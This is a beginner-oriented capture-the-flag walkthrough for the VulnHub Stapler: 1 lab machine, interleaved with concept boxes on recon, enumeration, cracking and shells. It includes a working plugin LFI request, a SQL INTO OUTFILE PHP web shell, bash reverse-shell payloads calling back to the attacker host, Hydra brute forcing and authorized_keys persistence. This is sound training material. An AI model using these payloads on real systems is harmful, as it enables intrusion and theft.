# Stapler: 1 — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | Stapler: 1 |
| **Difficulty** | Easy / Intermediate |
| **Author** | g0tmi1k |
| **Released** | 2016-06-08 |
| **VulnHub Entry** | <https://vulnhub.com/entry/stapler-1,150/> |
| **Download** | <https://vulnhub.com/entry/stapler-1,150/#download> |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Linux (Ubuntu 16.04) |

> A deliberately **enumeration-heavy** box with *many* services and multiple
> documented routes to both a shell and to `root`. The author (g0tmi1k) says
> there are at least two ways to get a limited shell and three ways to get root.
> This walkthrough follows one common chain and flags the alternates. Usernames,
> passwords and banners **vary by build**, so always verify what *your* target
> actually returns.

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

- How to enumerate a target with **many open services** (FTP, SMB, SSH, Tomcat,
  two web servers, MySQL, DNS).
- How to log in to **anonymous FTP** and read the **banner** for usernames.
- How to enumerate **SMB** shares and users with `smbclient` and `enum4linux`.
- How to enumerate a **WordPress** site with `wpscan` and exploit a plugin for
  **Local File Inclusion** to read `wp-config.php`.
- How to use leaked **MySQL** credentials in **phpMyAdmin** to write a PHP
  web-shell with `SELECT ... INTO OUTFILE`.
- How to obtain a shell as another user (via **SSH key reuse / password reuse**
  and readable home directories).
- How a **world-writable script run by a root cron job** (`cron-logrotate.sh`)
  turns into instant `root`.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). You should have Kali running and be able
to import an OVA.

---

## 1. Reconnaissance — finding the target

> **Goal:** identify the target's IP address on your isolated lab network.

```bash
# Identify your own IP + subnet first (the "eth0" adapter is the lab NIC)
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

> **How to read it:** the lab NIC holds a `192.168.56.x` (VirtualBox host-only)
> or `192.168.19x.x` (VMware) address. The target is on the **same** subnet.


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
# ARP-scan the subnet to list live hosts (fast, uses ARP not TCP)
sudo arp-scan --interface=eth0 --localnet
```

```text
Interface: eth0, type: EN10MB, MAC: 08:00:27:aa:bb:cc, IPv4: 192.168.56.10
Starting arp-scan 1.9.7 with 256 hosts
192.168.56.1    0a:00:27:00:00:00       (Unknown: locally administered)
192.168.56.100  08:00:27:1b:2c:3d       (Unknown)
192.168.56.101  08:00:27:4d:5e:6f       (Unknown)   <-- our target
```

**Target IP:** `192.168.56.101`

![arp-scan finding Stapler at 192.168.56.101](images/01-recon.png)

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration

> **Goal:** fingerprint every open port. There are a *lot* — take notes.


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
sudo nmap -sC -sV -p 21,22,53,80,139,443,666,3306,12380 -oA scans/services 192.168.56.101
```


> ### 📖 Concept — FTP, and why "anonymous" is the first thing to try
>
> **FTP** (port 21) predates modern authentication. It sends usernames, passwords and
> file contents in **cleartext**, and it has a built-in convention for public access:
> the account **`anonymous`**, traditionally with an email address (or nothing) as the
> password.
>
> ```bash
> ftp target                     # then: anonymous / (blank)
> curl -s ftp://anonymous:@target/
> wget -r ftp://anonymous:@target/          # mirror the whole tree
> nmap -p21 --script ftp-anon,ftp-vuln-cve2010-4221 target
> ```
>
> Inside an FTP session: `ls`, `cd`, `binary` (**switch mode before downloading
> anything non-text** — ASCII mode corrupts binaries), `get`, `mget`, `put`, `recurse`.
>
> **Two things to check immediately.** First, is anonymous access *enabled*? Second, is
> it **writable** — does `put shell.php` succeed? A writable FTP root that overlaps
> the web document root is a web-shell upload with no exploitation required. Also look
> for `backup.zip`, `creds.txt`, `id_rsa`, `web.config` and any `notes.txt` — authors
> leave the next step in a file named something obvious.
>
> ProFTPD 1.3.3c specifically ships a **compile-time backdoor** (`telnet target 6200`
> gives root); check the exact version against Exploit-DB before assuming you need
> credentials.
>
> **Deep dive:** [CONCEPTS §9.5 — FTP](../../docs/CONCEPTS.md#95-ftp--port-21)

```text
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4
53/tcp    open  domain      dnsmasq 2.75
80/tcp    open  http        Apache httpd 2.4.18 ((Ubuntu))
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X
443/tcp   open  ssl/http    Apache httpd 2.4.18 ((Ubuntu))
666/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
3306/tcp  open  mysql       MySQL 5.7.12
12380/tcp open  ssl/http    Apache httpd 2.4.18 ((Ubuntu))
```

> **How to read it:** each open port is a separate attack surface:
> **FTP** (anonymous?), **SSH**, **DNS**, **SMB**, **MySQL**, and *two* web
> servers (80 and 12380, plus oddballs 443 and 666). We will walk them one at a
> time. Enumerating all of this is the whole point of the box.

### 2.1 Anonymous FTP (port 21)

```bash
ftp 192.168.56.101
# when asked for a name, type: anonymous   (blank password)
```

```text
220-
220-| Harry, make sure to update the banner when you get a chance to show who has access here |
220-
230 Login successful.
ftp> ls
550 Permission denied.
ftp> get note
226 Transfer complete.
```

> **Why it works:** the FTP server allows **anonymous** logins and its **banner
> leaks a username (`Harry`)**. Directory listing is disabled, but we can still
> `get` the file `note`:

```bash
cat note
```


> ### 📖 Concept — How password cracking actually works
>
> A password hash is a **one-way** function. You cannot invert it — there is no
> "un-hash". You can only **guess and compare**: hash a candidate, see if it matches
> the target. Cracking speed is therefore measured in guesses per second, and the
> defence is to make each guess expensive.
>
> | Algorithm | GPU speed | Verdict |
> | --- | --- | --- |
> | MD5, SHA-1, SHA-256 | **Billions/sec** | Unusable for passwords |
> | MD5-crypt (`$1$`) | ~100k/sec | Obsolete |
> | bcrypt (`$2b$`) | ~20k/sec | Acceptable |
> | SHA-512-crypt (`$6$`) | ~10k/sec | Acceptable |
> | **phpass (`$P$`)** | ~5k/sec | WordPress/Drupal — 8192 MD5 rounds, deliberately slow |
> | yescrypt (`$y$`) | ~3k/sec | Modern Ubuntu default |
>
> ```bash
> john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
> john --show hash.txt                       # results without re-cracking
> john --format=phpass --wordlist=rockyou.txt hash.txt    # force the format
> unshadow /etc/passwd /etc/shadow > combined.txt         # prepare Linux hashes
> hashcat -m 400 -a 0 hash.txt rockyou.txt                # -m = mode, -a 0 = wordlist
> ```
>
> **Reading John's output:** `Loaded 1 password hash (phpass, …)` means it
> auto-detected the format correctly — if it says `No password hashes loaded`, pass
> `--format=` explicitly (`john --list=formats` lists them all). `1g 0:00:00:14 DONE`
> means one guess succeeded in 14 seconds, and `3842p/s` is the candidate rate — **that
> low number is the algorithm's defence working.**
>
> > ⚠️ **Always single-quote a hash on the command line.** In double quotes or bare,
> > the shell expands `$P`, `$1`, `$6` as variables and silently truncates it. This is
> > one of the most common reasons a crack "finds nothing".
>
> **If the wordlist fails, add rules before giving up** — automatic mangling that
> capitalises, appends digits and applies leetspeak:
>
> ```bash
> john --wordlist=rockyou.txt --rules hash.txt
> hashcat -m 0 -a 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
> ```
>
> `best64.rule` applies 64 transformations per word. A list that fails outright very
> often succeeds with rules, at 64× the cost.
>
> **Deep dive:** [CONCEPTS §14 — Password cracking](../../docs/CONCEPTS.md#14-password-cracking)

```text
Elly, make sure you update the note file when you get a chance...
(also references: John)
```

> **How to read it:** we now have candidate **usernames: Harry, Elly, John**.
> Keep them for password reuse / brute-force later.

### 2.2 SMB enumeration (port 139)


> ### 📖 Concept — SMB enumeration
>
> **SMB** (Server Message Block, ports 139/445) is Windows file and printer sharing,
> also present on most Linux servers via Samba. It is one of the richest enumeration
> targets there is: shares, users, groups, password policy, and often files.
>
> ```bash
> smbclient -L //target/ -N            # list shares with a NULL session (no credentials)
> smbclient //target/share -N          # connect; then: ls, cd, get, prompt, recurse
> smbmap -H target                     # shares AND your permission on each (R/W!)
> enum4linux -a target                 # users, groups, shares, policy — one shot
> crackmapexec smb target --shares     # modern, fast, scriptable
> rpcclient -U '' -N target            # then: enumdomusers, enumdomgroups, queryuser
> ```
>
> **Always try anonymous/NULL access first** — it is the most common finding. `-N`
> means "no password". If it works, `smbmap` will show `READ` or `WRITE` per share; a
> **writable** share you can reach over HTTP is a web-shell upload waiting to happen.
>
> Then hunt inside every share for `backup.zip`, `web.config`, `.kdbx`, `id_rsa`,
> `*.sql`, `site.txt`, `passwords.xls` — authors and real admins alike leave them
> there.
>
> **Deep dive:** [CONCEPTS §9.3 — SMB](../../docs/CONCEPTS.md#93-smb--ports-139445)

```bash
enum4linux -a 192.168.56.101
```

```text
 ==========================
|    Users on 192.168.56.101
 ==========================
user:[peter] rid:[0x3e9]
user:[JKanode] rid:[0x3f0]
user:[SHayslett] rid:[0x401]
...

 =====================
|    Share Enumeration
 =====================
Sharename   Type   Comment
---------   ----   -------
kathy       Disk
tmp         Disk
```

> **Why it works:** SMB (`enum4linux`) often lists **local users** and **shares**
> without any credentials. We now have a big user list and two shares to poke.

```bash
smbclient '\\192.168.56.101\kathy' -U anonymous -N
```

```text
smb: \> ls
  backups\        D        0  ...
smb: \backups\> get vsftpd.conf
```

```text
local_root=/etc
chroot_local_user=YES
```

> **Why it works:** the `kathy` share exposes a backup of `vsftpd.conf`. It tells
> us the FTP server **chroots local users into `/etc`** — meaning that if we can
> log in as *any valid local user*, we can read `/etc/passwd`.

### 2.3 The web servers (ports 80, 666 and 12380)


> ### 📖 Concept — What is content discovery, and what is a wordlist?
>
> **Content discovery** means *guessing URL paths and keeping the ones that exist*.
> There is no cleverness — it is a dictionary attack against the URL space. A web
> server will serve anything it has but does not advertise an index, so the tool
> requests `/admin`, `/backup`, `/config.php` … one at a time and classifies each
> response.
>
> A **wordlist** is a plain text file, one candidate per line. Its power comes from an
> empirical fact: **web directory names are not random.** `/admin`, `/phpmyadmin`,
> `/wp-content` appear on thousands of sites, so a curated list of a few thousand
> words beats a random generator of millions. Common sources on Kali:
>
> | List | Size | Notes |
> | --- | --- | --- |
> | `dirb/common.txt` | 4,612 | Hand-curated; fast first pass |
> | `dirb/big.txt` | 204,669 | Second pass; finds what `common` misses |
> | `directory-list-2.3-medium.txt` | 220,547 | Crawled from real sites |
> | **SecLists** | huge | The professional standard — `apt install seclists` |
>
> **The status codes are the whole result:** `200` exists and is readable · `201`
> means a `PUT` succeeded, **you can write files here** · `301` is usually a
> *directory* needing a trailing `/` · `403` means **it exists** but you may not read
> it — itself an information leak · `404` is the baseline · `500` means **your input
> broke something**, often injection.
>
> > **`401` vs `403` matters most.** `401` = "I don't know who you are"
> > (*authenticate*). `403` = "I know who you are and you may not" (*authorise*).
>
> **The extension flag (`-x` / `-X`) is the difference between finding nothing and
> finding everything.** `/secret` 404s; `/secret.txt` 200s. **If a scan comes back
> empty, change the extension list before you change the wordlist.** Try
> `php,txt,html,bak,old,zip,conf,log,inc`.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§8 — Content discovery](../../docs/CONCEPTS.md#8-content-discovery--finding-hidden-urls)

```bash
curl -s http://192.168.56.101/ | grep -iE "title|href|admin|blog"
gobuster dir -u http://192.168.56.101/ -w /usr/share/wordlists/dirb/common.txt
```

```text
/admin112233/          (a decoy)
/blogblog/             (a WordPress site!)
/phpmyadmin/           (phpMyAdmin)
```

> **How to read it:** the interesting app is **WordPress at `/blogblog/`** for
> the WordPress database. The full site also lives on the HTTPS server on
> `12380` (`https://192.168.56.101:12380/blogblog/`). We will target it there.

### 2.4 Enumerate WordPress with `wpscan`


> ### 📖 Concept — How does WordPress leak usernames?
>
> WordPress builds author archive URLs from a **numeric user ID**:
>
> ```text
> /wordpress/?author=1   →  301 → /wordpress/author/michael/
> /wordpress/?author=2   →  301 → /wordpress/author/steven/
> ```
>
> The ID counts up from 1 and the redirect target contains the **username**.
> `wpscan -e u` just loops the IDs until they stop resolving. Watch it happen by hand
> in a browser — that is worth more than reading about it.
>
> **The `-e` flag chooses what to enumerate:** `u` users · `p` **plugins** (the most
> common WordPress compromise vector) · `t` themes · `vp`/`vt` only *vulnerable*
> plugins/themes · `cb` config backups (`wp-config.php.bak` — a jackpot) · `dbe`
> database exports.
>
> wpscan also labels *how* it found things, and the labels matter: **Passive
> Detection** means inferred from data the site publishes anyway (RSS, bylines) — the
> site does not notice. **Aggressive Detection** means it actively probed (brute
> forcing author IDs, submitting bad logins to read error messages) — which writes
> log entries.
>
> **Why usernames matter:** they are half of every credential pair. With two known
> usernames you can attack `wp-login.php` *and* SSH directly instead of guessing both
> halves.
>
> **Deep dive:** [CONCEPTS §9.2 — WordPress / wpscan](../../docs/CONCEPTS.md#92-wordpress--wpscan)

```bash
wpscan --url https://192.168.56.101:12380/blogblog/ --disable-tls-checks \
       --enumerate ap,u
```

```text
[+] WordPress theme in use: twentyfifteen
[+] Enumerating plugins (with max threads 5)...
[+] advanced-video-embed
 | Location: .../wp-content/plugins/advanced-video-embed/
[i] No users found... (varies)
```

> **Why it works:** `wpscan` fingerprints the WordPress **version, theme and
> plugins**. The plugin **`advanced-video-embed`** has a known **Local File
> Inclusion / arbitrary-file-read** issue in its `admin-ajax.php` handler.

![wpscan finding the advanced-video-embed plugin](images/03-enum.png)

---

## 3. Foothold

> **Goal:** get a shell. This box has several ways — we cover the WordPress path
> and two alternatives.

### 3.1 Read `wp-config.php` with the plugin LFI

The vulnerable `ave_publishPost` action takes a `thumb` parameter that is
included as a file, and it also writes the result as a “.jpg” into the uploads
folder. Point it at the config file:


> ### 📖 Concept — Why CMS config files are such a big deal
>
> A CMS must know how to reach its database on **every single page request**, so its
> config file necessarily contains those credentials **in plaintext**. There is no way
> to avoid that — it is inherent to how the software works.
>
> Three consequences:
>
> 1. **Any local user who can read the web root has the database password.**
> 2. **Any Local File Inclusion anywhere on the site leaks it** — on many boxes you
>    never get a shell first; you read the config through an LFI and go straight to
>    the database.
> 3. **A backup of it is a jackpot.** `wp-config.php.bak`, `.wp-config.php.swp`,
>    `wp-config.php~` are served as *text* rather than executed, so a misconfigured
>    server hands them over plain HTTP. `wpscan -e cb` hunts for exactly these.
>
> | Stack | Config file |
> | --- | --- |
> | WordPress | `wp-config.php` |
> | Joomla | `configuration.php` |
> | Laravel / most Node | `.env` |
> | Django | `settings.py` |
> | Rails | `config/database.yml`, `config/master.key` |
> | .NET | `web.config` |
>
> ```bash
> grep -E 'DB_USER|DB_PASSWORD|DB_HOST' wp-config.php
> mysqldump -u root -p'PASS' wordpress | grep -iE 'flag|password|secret'
> ```
>
> **The real finding is usually not the file — it is `DB_USER = 'root'`.** A CMS should
> connect with a dedicated least-privilege account that can only `SELECT`/`INSERT`/
> `UPDATE`/`DELETE` on its own database. When it connects as the database superuser,
> "read a config file" escalates into "execute operating-system commands as root"
> (via MySQL's `LOAD_FILE`/`INTO DUMPFILE` and UDF loading).
>
> **Deep dive:** [CONCEPTS §9.8 — MySQL](../../docs/CONCEPTS.md#98-mysql--port-3306)

```bash
curl -k "https://192.168.56.101:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=../wp-config.php"
```

```text
(JSON response containing the wp-config.php source)
```

> **Why it works:** the plugin does not sanitise `thumb`, so `../wp-config.php`
> is read directly and stashed as an image in
> `/blogblog/wp-content/uploads/`. `wp-config.php` holds the **MySQL database
> credentials**:

```text
define('DB_USER', 'root');
define('DB_PASSWORD', 'plbkac');     // value varies by build
define('DB_NAME', 'wordpress');
```

> **How to read it:** we now have MySQL `root` credentials. There are two ways
> to cash them in: log in to **phpMyAdmin**, or open a **MySQL** connection.

### 3.2 Drop a PHP web-shell via phpMyAdmin

Log in to phpMyAdmin (`http://192.168.56.101/phpmyadmin/`) with the creds above,
then run an SQL statement that writes a file into the web root. First confirm
where the uploads folder physically lives (trial and error — it is
`/var/www/https` on this build):

```sql
SELECT '<?php system($_GET["cmd"]); ?>' 
INTO OUTFILE '/var/www/https/blogblog/wp-content/uploads/shell.php';
```

> **Why it works:** MySQL's `INTO OUTFILE` writes the query result to a path the
> `mysql` OS user can write. The `uploads` directory is web-readable and has
> **directory listing enabled**, and PHP files there are executed by Apache — so
> we have planted a web-shell.

```bash
curl -k "https://192.168.56.101:12380/blogblog/wp-content/uploads/shell.php?cmd=id"
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Now upgrade this into a real reverse shell:


> ### 📖 Concept — What is a reverse shell, and why not a bind shell?
>
> | | **Bind shell** | **Reverse shell** |
> | --- | --- | --- |
> | Who listens? | **The target** opens a port and waits | **You** open a port and wait |
> | Who connects? | You → target | Target → you |
> | Blocked by | The target's firewall (inbound) | Your firewall (rarely an issue) |
> | Practical? | Rarely — servers filter inbound | **Almost always** |
>
> **Reverse shells dominate because egress filtering is far less common than ingress
> filtering.** A web server that cannot make outbound connections cannot fetch
> updates, call APIs, or reach its database — so outbound is usually left open.
>
> ```bash
> # Kali — the listener. Start it BEFORE you trigger the payload.
> nc -lvnp 4444
> ```
>
> `-l` listen · `-v` verbose · `-n` no DNS lookups (faster) · `-p 4444` port. Use a
> port **above 1024** so you do not need root, and check nothing else has it:
> `ss -tulnp | grep 4444`.
>
> ```bash
> # The payload, in its most portable form:
> bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
> ```
>
> `>&` sends stdout **and** stderr to the TCP socket; `0>&1` sends stdin to the same
> place. That combination is what makes the shell *interactive* rather than
> print-only. Note `/dev/tcp` is a **bash** feature — plain POSIX `sh` does not have
> it, which is why this payload fails on some minimal targets.
>
> **URL-encode it before putting it in a query string.** `&`, `>` and spaces are all
> meaningful or illegal in a URL and will be mangled before PHP ever sees them:
>
> ```bash
> python3 -c "import urllib.parse as u; print(u.quote("bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'"))"
> ```
>
> Kali ships ready-made shells under **`/usr/share/webshells/`** (`php/`, `perl/`,
> `asp/`, `jsp/`). Always `grep -nE '^\$(ip|port)'` to **verify** you edited them
> before uploading.
>
> **Deep dive:** [CONCEPTS §12 — Shells: bind, reverse, and TTYs](../../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)

```bash
# On Kali
nc -lvnp 4444
```

```bash
curl -k "https://192.168.56.101:12380/blogblog/wp-content/uploads/shell.php" \
  --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/192.168.56.10/4444 0>&1"'
```

```text
www-data@red:/var/www/https/blogblog/wp-content/uploads$
```


> ### 📖 Concept — Why you must upgrade to a real TTY
>
> A raw `nc` shell is crippled in four ways: no tab completion, no arrow keys,
> **`Ctrl+C` kills your *listener* instead of the remote process**, and anything
> needing a real terminal (`su`, `sudo`, `vim`, `top`, `less`) fails with
> `standard input must be a tty`.
>
> ```bash
> # 1. On the TARGET — allocate a pseudo-terminal
> python3 -c 'import pty; pty.spawn("/bin/bash")'
> #    older boxes: python -c ...    or:    script -q /dev/null -c /bin/bash
>
> # 2. Press Ctrl+Z  — this SUSPENDS the nc job on Kali
>
> # 3. On KALI — put your local terminal into raw mode and resume
> stty raw -echo; fg
>
> # 4. On the TARGET — match your real terminal size
> export TERM=xterm; export SHELL=bash
> stty rows 40 cols 160
> ```
>
> **What each step did:**
> - `pty.spawn()` allocates a **pseudo-terminal** — a kernel object that behaves like a
>   real teletype. This is what makes `sudo` and `vim` work at all.
> - `stty raw -echo` makes **your local** terminal pass keystrokes through
>   uninterpreted and not echo them (the remote side echoes). This is what makes
>   `Ctrl+C` reach the remote process instead of killing your session.
> - `fg` resumes the suspended `nc`.
> - `stty rows/cols` tells the remote pty your dimensions so `less` and `top` do not
>   wrap into garbage.
>
> **Do this immediately after every shell.** Trying to `su` or run `sudo -l` on an
> unupgraded shell is a very common way to conclude wrongly that a path does not work.
>
> **Deep dive:** [CONCEPTS §12.3 — Upgrading to a real TTY](../../docs/CONCEPTS.md#123-upgrading-to-a-real-tty--do-this-immediately)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z, then:  stty raw -echo; fg  ; and:  export TERM=xterm
```

![phpMyAdmin writing the shell and the reverse shell as www-data](images/04-foothold.png)

### 3.3 Alternative foothold — SSH via leaked / reused keys and passwords

The author intends multiple shell routes. Two common ones:

**a) SSH key material left readable.** Because `vsftpd` chroots local users into
`/etc` and several **home directories are world-readable**, once you have low
privileges — or FTP access as a local user — you can read other users' files,
including **`.ssh/id_rsa` private keys**:


> ### 📖 Concept — SSH keys: the credential people forget
>
> An SSH **private key** is a credential exactly like a password, and finding one is
> often better than finding a password: no cracking, no lockout, no log noise from
> failed attempts.
>
> | File | What it is |
> | --- | --- |
> | `~/.ssh/id_rsa`, `id_ed25519`, `id_ecdsa` | **Private** key — never leaves the owner's machine. If you find one, you have that user's access. |
> | `~/.ssh/id_rsa.pub` | Public key — harmless on its own |
> | `~/.ssh/authorized_keys` | Public keys **permitted to log in as this user**. Writable? Append your own key and log in with no password. |
> | `~/.ssh/known_hosts` | Hosts this user has connected to — **a map of other machines to pivot toward** |
>
> ```bash
> ssh -i id_rsa user@target
> ssh -i id_rsa -o IdentitiesOnly=yes user@target      # ignore ssh-agent, use only this key
> ```
>
> **If the key is passphrase-protected**, crack it offline — you never touch the
> server:
>
> ```bash
> ssh2john id_rsa > key.hash
> john --wordlist=/usr/share/wordlists/rockyou.txt key.hash
> # or:  hashcat -m 22921 -a 0 key.hash rockyou.txt    (22931 for ed25519)
> ```
>
> **Writing your own key is the cleanest persistence there is:**
>
> ```bash
> ssh-keygen -t ed25519 -f labkey -N ''                # -N '' = no passphrase
> cat labkey.pub >> /home/user/.ssh/authorized_keys    # if you can write it
> chmod 600 /home/user/.ssh/authorized_keys            # ssh refuses loose permissions
> ssh -i labkey user@target
> ```
>
> Note the `chmod 600` — `sshd` **silently ignores** an `authorized_keys` with overly
> permissive modes, which makes "my key does not work" a permissions problem more
> often than a key problem.
>
> **Always try a found key against *every* user on *every* host** you know about. Key
> reuse across machines and accounts is extremely common.
>
> **Deep dive:** [CONCEPTS §9.9 — SSH](../../docs/CONCEPTS.md#99-ssh--port-22) ·
> [§16.2 — Harvesting credentials](../../docs/CONCEPTS.md#162-harvesting-credentials)

```bash
# From a low-priv shell or via FTP (local_root=/etc gives some file reads)
find /home -name id_rsa -o -name "*.key" 2>/dev/null
cat /home/<user>/.ssh/id_rsa
```

```bash
# Use a recovered key on your own machine
chmod 600 id_rsa
ssh -i id_rsa <user>@192.168.56.101
```

> **Why it works:** a private key is a *password that never expires*. If it is
> readable by another user, that user can log in as the key's owner. Key material
> and permissions differ per build, so treat the exact path as
> *varies by build*.

**b) Username-list brute force.** Build a user list from the FTP banner, SMB
enumeration and `/etc/passwd`, then:


> ### 📖 Concept — What is Hydra doing?
>
> **Hydra** is a network login brute-forcer. It speaks the login protocol of ~50
> services (SSH, FTP, HTTP, MySQL, SMB, RDP, VNC, SNMP…) and tries credential
> combinations until one is accepted. There is no exploit and no cleverness — it is a
> very fast, very patient guesser.
>
> | Flag | Meaning |
> | --- | --- |
> | `-l USER` / `-L file` | single **l**ogin name / a *file* of them |
> | `-p PASS` / `-P file` | single **p**assword / a *file* of them |
> | `-C file` | a file of colon-separated `user:pass` **pairs** (credential stuffing) |
> | **`-e nsr`** | also try **n**ull password, **s**ame-as-username, and **r**eversed username |
> | `-f` | stop at the first success |
> | `-t N` | threads — higher is faster, noisier, and can destabilise a lab VM |
> | `-I` | ignore a stale `hydra.restore` file |
> | `ssh://` | the **service module** — picking the wrong one is the most common Hydra mistake |
>
> **`-e nsr` should be on every run.** The three cheapest guesses in existence are
> empty, the username, and the reversed username — and they succeed astonishingly
> often, usually in under a second, before the wordlist is even consulted.
>
> **A wordlist attack is not a brute force.** Different attacks, different costs:
>
> | Attack | Tries | Notes |
> | --- | --- | --- |
> | **Wordlist** | curated list, many passwords → **one** account | Fast, high hit rate |
> | **Brute force** | every character combination | Astronomically slow |
> | **Password spraying** | **one** password → **many** accounts | Stays under per-account lockout thresholds |
> | **Credential stuffing** | real leaked `user:pass` pairs | Exploits reuse |
>
> > ⚠️ Pointing Hydra at all 14 million lines of `rockyou.txt` over SSH would take
> > days and generate millions of failed logins in `auth.log`. Fine on a VM you own;
> > on a real system it is an obvious, logged event. Professionals throttle with
> > `-t 4`, use a short targeted list, and spray rather than hammer.
>
> **Deep dive:** [CONCEPTS §7 — What is a wordlist?](../../docs/CONCEPTS.md#7-what-is-a-wordlist) ·
> [§7.4 — Recognising the shape of the tool call](../../docs/CONCEPTS.md#74-recognising-the-shape-of-the-tool-call)

```bash
hydra -L users.txt -e nsr ssh://192.168.56.101
```

```text
[22][ssh] host: 192.168.56.101   login: SHayslett   password: SHayslett
```

> **How to read it:** `-e nsr` tries the **null** password, the **same** string
> as the username, and the **reverse** of the username. `SHayslett` reused his
> own name as a password. Any of these routes lands you a shell.

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
